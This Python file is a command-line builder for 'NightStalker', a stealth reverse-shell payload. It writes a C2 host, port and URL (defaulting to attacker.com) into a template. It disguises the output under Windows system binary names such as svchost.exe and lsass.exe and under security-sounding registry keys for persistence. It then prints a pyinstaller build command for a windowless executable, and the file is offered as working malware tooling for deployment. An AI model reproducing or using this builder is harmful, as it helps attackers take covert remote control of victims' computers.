#!/usr/bin/env python3
"""
NightStalker - Payload Builder CLI
Generate customized stealth reverse shell payloads
"""

import os
import sys
import argparse
import random
import string

def generate_random_key(length=16):
    """Generate random encryption key"""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_system_name():
    """Generate system-looking filename"""
    system_names = [
        "winupdate.exe", "svchost.exe", "lsass.exe", "csrss.exe",
        "winlogon.exe", "services.exe", "spoolsv.exe", "explorer.exe",
        "rundll32.exe", "regsvr32.exe", "msiexec.exe", "wscript.exe",
        "cscript.exe", "powershell.exe", "cmd.exe", "conhost.exe"
    ]
    return random.choice(system_names)

def generate_registry_name():
    """Generate system-looking registry key name"""
    registry_names = [
        "WindowsUpdate", "SystemRestore", "SecurityCenter", "WindowsDefender",
        "MicrosoftUpdate", "WindowsSecurity", "SystemMaintenance", "WindowsService",
        "MicrosoftSecurity", "WindowsMaintenance", "SystemUpdate", "SecurityUpdate"
    ]
    return random.choice(registry_names)

def build_payload(lhost, lport, payload_name=None, reg_key_name=None, 
                  encryption_key=None, use_https=False, c2_url=None, output_file=None):
    """Build customized payload"""
    
    # Set defaults if not provided
    if not payload_name:
        payload_name = generate_system_name()
    if not reg_key_name:
        reg_key_name = generate_registry_name()
    if not encryption_key:
        encryption_key = generate_random_key(16)
    if not output_file:
        output_file = f"stealth_payload_{lhost.replace('.', '_')}_{lport}.py"
    
    # Read template
    template_path = os.path.join(os.path.dirname(__file__), "stealth_reverse_shell.py")
    
    try:
        with open(template_path, 'r') as f:
            template = f.read()
    except FileNotFoundError:
        print(f"Error: Template file not found at {template_path}")
        return False
    
    # Replace configuration values
    replacements = {
        'LHOST = "192.168.1.100"': f'LHOST = "{lhost}"',
        'LPORT = 4444': f'LPORT = {lport}',
        'PAYLOAD_NAME = "winupdate.exe"': f'PAYLOAD_NAME = "{payload_name}"',
        'REG_KEY_NAME = "WindowsUpdate"': f'REG_KEY_NAME = "{reg_key_name}"',
        'ENCRYPTION_KEY = "NightStalker2024!"': f'ENCRYPTION_KEY = "{encryption_key}"',
        'USE_HTTPS = False': f'USE_HTTPS = {str(use_https)}',
        'C2_URL = "https://attacker.com/shell"': f'C2_URL = "{c2_url or "https://attacker.com/shell"}"'
    }
    
    for old, new in replacements.items():
        template = template.replace(old, new)
    
    # Write customized payload
    try:
        with open(output_file, 'w') as f:
            f.write(template)
        
        print(f"\n[+] Payload generated successfully!")
        print(f"[+] Output file: {output_file}")
        print(f"[+] Configuration:")
        print(f"    - C2 Server: {lhost}:{lport}")
        print(f"    - Payload name: {payload_name}")
        print(f"    - Registry key: {reg_key_name}")
        print(f"    - Encryption key: {encryption_key}")
        print(f"    - HTTPS mode: {use_https}")
        if use_https and c2_url:
            print(f"    - C2 URL: {c2_url}")
        
        print(f"\n[+] Build command:")
        print(f"    pyinstaller --noconsole --onefile {output_file}")
        
        return True
        
    except Exception as e:
        print(f"Error writing payload: {e}")
        return False

def interactive_builder():
    """Interactive payload builder"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                    NightStalker Payload Builder              ║
║                    Advanced Stealth Reverse Shell            ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Get C2 server details
    lhost = input("Enter C2 server IP [192.168.1.100]: ").strip() or "192.168.1.100"
    lport = input("Enter C2 server port [4444]: ").strip() or "4444"
    
    try:
        lport = int(lport)
    except ValueError:
        print("Invalid port number, using 4444")
        lport = 4444
    
    # Communication method
    print("\nCommunication method:")
    print("1. Raw socket (default)")
    print("2. HTTPS")
    choice = input("Choose method [1]: ").strip() or "1"
    
    use_https = choice == "2"
    c2_url = None
    
    if use_https:
        c2_url = input("Enter C2 HTTPS URL [https://attacker.com/shell]: ").strip() or "https://attacker.com/shell"
    
    # Payload customization
    print("\nPayload customization:")
    custom_name = input("Enter custom payload name (or press Enter for random): ").strip()
    custom_reg = input("Enter custom registry key name (or press Enter for random): ").strip()
    custom_key = input("Enter custom encryption key (or press Enter for random): ").strip()
    
    # Output file
    output_file = input(f"Enter output filename [stealth_payload_{lhost.replace('.', '_')}_{lport}.py]: ").strip()
    if not output_file:
        output_file = f"stealth_payload_{lhost.replace('.', '_')}_{lport}.py"
    
    # Build payload
    success = build_payload(
        lhost=lhost,
        lport=lport,
        payload_name=custom_name if custom_name else None,
        reg_key_name=custom_reg if custom_reg else None,
        encryption_key=custom_key if custom_key else None,
        use_https=use_https,
        c2_url=c2_url,
        output_file=output_file
    )
    
    if success:
        print("\n[+] Payload ready for deployment!")
        print("[+] Remember to set up your C2 server before deploying the payload.")

def main():
    parser = argparse.ArgumentParser(
        description="NightStalker - Advanced Stealth Reverse Shell Payload Builder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --lhost 192.168.1.100 --lport 4444
  %(prog)s --lhost 10.0.0.5 --lport 8080 --https --url https://attacker.com/shell
  %(prog)s --interactive
        """
    )
    
    parser.add_argument("--lhost", help="C2 server IP address")
    parser.add_argument("--lport", type=int, help="C2 server port")
    parser.add_argument("--name", help="Custom payload filename")
    parser.add_argument("--reg-key", help="Custom registry key name")
    parser.add_argument("--encryption-key", help="Custom encryption key")
    parser.add_argument("--https", action="store_true", help="Use HTTPS communication")
    parser.add_argument("--url", help="C2 HTTPS URL (required if --https)")
    parser.add_argument("--output", help="Output filename")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interactive mode")
    
    args = parser.parse_args()
    
    if args.interactive:
        interactive_builder()
        return
    
    if not args.lhost or not args.lport:
        print("Error: --lhost and --lport are required (or use --interactive)")
        parser.print_help()
        return
    
    if args.https and not args.url:
        print("Error: --url is required when using --https")
        return
    
    success = build_payload(
        lhost=args.lhost,
        lport=args.lport,
        payload_name=args.name,
        reg_key_name=args.reg_key,
        encryption_key=args.encryption_key,
        use_https=args.https,
        c2_url=args.url,
        output_file=args.output
    )
    
    if not success:
        sys.exit(1)

if __name__ == "__main__":
    main() 